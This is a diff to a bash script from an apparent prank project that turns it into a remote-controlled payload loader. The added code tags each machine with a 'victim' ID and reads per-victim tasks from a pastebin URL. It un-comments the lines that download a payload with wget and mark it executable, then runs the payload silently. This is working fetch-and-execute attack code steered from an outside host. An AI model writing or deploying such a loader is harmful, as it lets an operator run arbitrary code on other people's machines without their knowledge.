@@ -3,10 +3,18 @@
 
 SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
+
+victim="$1"
+if [ -z "$victim" ]; then
+  victim="$USER.`hostname`"
+fi
+echo "Victim ID: $victim"
+
 ###################################################################
  # Configuration variables
-payloadURL="https://raw.githubusercontent.com/thiesgehrmann/arduinoPranks/master/websiteReactionPrank/scriptloc.txt"
+taskURL="https://pastebin.com/raw/PPUdAf1s"
 
+localTaskData="$SCRIPTDIR/taskdata"
 localPayloadLoc="$SCRIPTDIR/payload"
 localPayloadETag="$SCRIPTDIR/payload.etag"
 localPayloadURL="$SCRIPTDIR/payload.url"
@@ -29,24 +37,39 @@ function getURLETag(){
    | cut -d'"' -f2
 }
 
+function getTaskURL(){
+  local victimID="$1"
+
+  cat "$localTaskData" \
+   | grep -v -e '^#' -e'^$' \
+   | grep "^$victimID" \
+   | cut -d\   -f2 \
+   | head -n1
+}
+
 function getPayloadURL(){
   local url="$1"
-  curl -H 'Cache-Control: no-cache' -s "$url" \
-   | grep -v -e '^#' -e'^$' \
-   | head -n1
+  
+  curl -H 'Cache-Control: no-cache' -s "$url" > "$localTaskData"
+  local payloadURL=`getTaskURL "$victim"`
+  if [ -z "$payloadURL" ]; then
+    payloadURL=`getTaskURL "default"`
+  fi
+  echo "$payloadURL"
+
 }
 
 function downloadURL(){
   local url="$1"
   local outfile="$2"
   echo "Downloading $url"
-  #wget -O "$2" "$1"
-  #chmod +x "$2"
+  wget -O "$2" "$1"
+  chmod +x "$2"
 }
 
 function downloadPayloadIfNeeded(){
 
-  local remoteURL=`getPayloadURL "$payloadURL"`
+  local remoteURL=`getPayloadURL "$taskURL"`
   local remoteURLETag=`getURLETag "$remoteURL"`
 
   localURL=`head -n1 "$localPayloadURL"`
@@ -75,7 +98,7 @@ function downloadPayloadIfNeeded(){
 }
 
 function runPayload() {
-  "$localPayloadLoc" &> /dev/null
+  "$localPayloadLoc" "$victim" &> /dev/null
 }
 
 ###################################################################
